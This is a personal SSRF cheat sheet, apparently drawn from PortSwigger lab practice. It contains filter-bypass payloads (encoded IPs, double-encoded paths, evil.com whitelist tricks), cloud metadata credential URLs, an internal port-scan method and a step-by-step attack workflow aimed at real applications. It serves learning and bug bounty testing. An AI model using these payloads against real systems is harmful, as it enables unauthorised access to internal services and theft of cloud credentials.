# SSRF — Cheat Sheet

## Quick Reference — What Type of Filter?

```
Try http://127.0.0.1/admin
        ↓
   Blocked? → Try http://127.1/admin
                      ↓
                 Blocked? → Blacklist filter
                 Allowed? → No filter / weak filter

Try http://127.0.0.1/
        ↓
   "URL must contain X" → Whitelist filter
```

---

## Blacklist Bypass — Quick Picks

| Blocked | Try Instead |
|---|---|
| `127.0.0.1` | `127.1` |
| `127.0.0.1` | `2130706433` |
| `127.0.0.1` | `017700000001` |
| `localhost` | `lOcAlHoSt` |
| `/admin` | `/%2561dmin` (double encode `a`) |
| `/admin` | `/%61dmin` (single encode `a`) |

---

## Whitelist Bypass — Quick Picks

| Technique | Payload |
|---|---|
| @ credentials | `http://localhost@whitelisted-host.com/` |
| # fragment | `http://evil.com#whitelisted-host.com` |
| Subdomain | `http://whitelisted-host.com.evil.com` |
| @ + double encoded # | `http://localhost%2523@whitelisted-host.com/admin` |

---

## Labs Completed

| Lab | Difficulty | Technique Used | Tool |
|---|---|---|---|
| SSRF basic (against server) | Apprentice | Change stockApi to 127.0.0.1/admin | Burp Repeater |
| SSRF against backend system | Apprentice | Scan internal 192.168.0.x range | Burp Intruder |
| SSRF with blacklist filter | Practitioner | `127.1` + `%2561dmin` | Burp Repeater |
| SSRF with whitelist filter | Practitioner | `localhost:80%2523@stock.weliketoshop.net` | Burp Repeater |
| Blind SSRF out-of-band | Practitioner | ❌ Skipped — needs Collaborator | — |
| Blind SSRF Shellshock | Expert | ❌ Skipped — needs Collaborator | — |

---

## SSRF Attack Surface — Where to Look

### Parameters
```
url=  path=  dest=  redirect=  uri=  endpoint=
proxy=  fetch=  load=  src=  source=  target=  link=
```

### Headers
```
Referer:        ← analytics software fetches this
X-Forwarded-For:
Host:
```

### Features
```
PDF export          → fetches URLs to render
Screenshot tool     → fetches URLs directly
Import from URL     → server fetches the file
Link preview        → server fetches to generate preview
Image upload by URL → server fetches the image
Webhooks            → server makes outbound calls
XML input           → XXE → SSRF
```

---

## Internal Targets — Priority Order

```
1. http://127.0.0.1/admin           ← always first
2. http://localhost/admin
3. http://169.254.169.254/          ← if cloud hosted
4. http://127.0.0.1:8080/          ← alternate ports
5. http://10.0.0.X/                ← internal network
6. http://192.168.0.X/             ← internal network
```

---

## Cloud Metadata — Must Try

```
AWS:    http://169.254.169.254/latest/meta-data/iam/security-credentials/
GCP:    http://metadata.google.internal/computeMetadata/v1/
Azure:  http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

---

## How to Identify the Whitelist

| Source | What it reveals |
|---|---|
| Normal app requests (Burp) | The trusted host already in use |
| Error messages | Exact whitelist rule (often leaked) |
| JS / source code | Hardcoded allowed hosts |
| API docs / swagger | Internal services being called |
| Trial and error | How strict the filter is |

---

## Blind SSRF — Free Collaborator Alternatives

```
interactsh    → best free option, logs DNS + HTTP
webhook.site  → simple HTTP logger
canarytokens  → alerts on hit
requestbin    → HTTP logger
```

---

## Encoding Reference

```
#    → %23   → %2523  (double)
/    → %2F   → %252F  (double)
a    → %61   → %2561  (double)
@    → %40
.    → %2E
:    → %3A
```

---

## Real World Workflow

```
Step 1 — Recon
  Browse the app with Burp running
  Find parameters that look URL-like
  Note any features that fetch external content

Step 2 — Identify the filter type
  Try http://127.0.0.1/ → blocked?
  Read the error message → what does it say?
  Error reveals the rule (whitelist value or blocked keywords)

Step 3 — Confirm SSRF
  Try http://127.0.0.1/admin
  Try http://127.1/admin
  Try http://localhost/admin
  Any different response = potential SSRF

Step 4 — If cloud hosted
  Try http://169.254.169.254/latest/meta-data/
  This is the biggest win in bug bounty

Step 5 — Internal recon via SSRF
  Port scan: 22, 3306, 6379, 8080, 27017
  Different error = port open
  Timeout = port closed / filtered

Step 6 — Read error messages throughout
  Internal hostnames often leak in errors
  These leaked names = new targets to try

Step 7 — Check Referer header
  Add Referer: http://127.0.0.1/admin
  Check if response differs or OOB hit received

Step 8 — Check XML input
  If app accepts XML → try XXE → SSRF
```

---

## SSRF vs Blind SSRF

| | SSRF | Blind SSRF |
|---|---|---|
| Response visible? | ✅ Yes | ❌ No |
| Confirmation method | Read the response | Out-of-band (Collaborator / interactsh) |
| Tool needed | Burp Community | Burp Pro or interactsh |
| Where to inject | URL params, body | Referer header, any URL param |
| Impact | Read internal data | Confirm vulnerability exists, pivot further |

---

## Why Blacklists Fail

```
Blacklist checks for:  "127.0.0.1"
You send:              "127.1"         → same IP, not in blacklist

Blacklist checks for:  "admin"
You send:              "%2561dmin"     → decodes to "admin" after filter

Blacklist checks for:  "localhost"
You send:              "lOcAlHoSt"    → same host, different case
```

## Why Whitelists Are Stronger (But Still Breakable)

```
Whitelist checks for:  contains "stock.weliketoshop.net"
You send:              "localhost%2523@stock.weliketoshop.net"
Filter sees:           stock.weliketoshop.net ✅
Server sees:           localhost (after decoding %2523 → #)
```

The gap between what the FILTER reads and what the SERVER executes is always the exploit.
